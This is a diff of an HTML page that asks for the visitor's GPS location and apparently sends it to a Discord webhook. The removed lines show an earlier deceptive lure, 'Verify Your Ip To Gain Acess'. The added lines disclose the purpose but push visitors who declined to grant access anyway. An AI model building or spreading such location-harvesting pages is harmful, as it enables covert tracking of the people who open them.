@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Permision Granter</title>
+    <title>GPS Location Sender</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -45,13 +45,30 @@
         .error {
             color: #dc3545;
         }
+        #btn-allow {
+            display: none;
+            margin-top: 1.5rem;
+            padding: 0.8rem 2rem;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        #btn-allow:hover {
+            background-color: #0056b3;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Ip Verifying Sender</h1>
-        <p>Verify Your Ip To Gain Acess</p>
+        <h1>GPS Location Sender</h1>
+        <p>This page requests your GPS location and sends it to a Discord webhook.</p>
         <div id="status" class="loading">Requesting location permission...</div>
+        <button id="btn-allow" onclick="getLocation()">Allow Location Access</button>
     </div>
 
     <script>
@@ -59,8 +76,15 @@
 
         function updateStatus(message, className) {
             const statusDiv = document.getElementById('status');
+            const btn = document.getElementById('btn-allow');
             statusDiv.textContent = message;
             statusDiv.className = className;
+
+            if (className === 'error') {
+                btn.style.display = 'inline-block';
+            } else {
+                btn.style.display = 'none';
+            }
         }
 
         async function sendToDiscord(lat, lon) {
@@ -102,10 +126,10 @@
                     let errorMessage = 'An unknown error occurred.';
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = 'User denied the request for Geolocation.';
+                            errorMessage = 'User denied or browser blocked the request. Please click the button below to allow manually.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = 'Location information is unavailable.';
+                            errorMessage = 'Location information is unavailable. Make sure your GPS is ON.';
                             break;
                         case error.TIMEOUT:
                             errorMessage = 'The request to get user location timed out.';
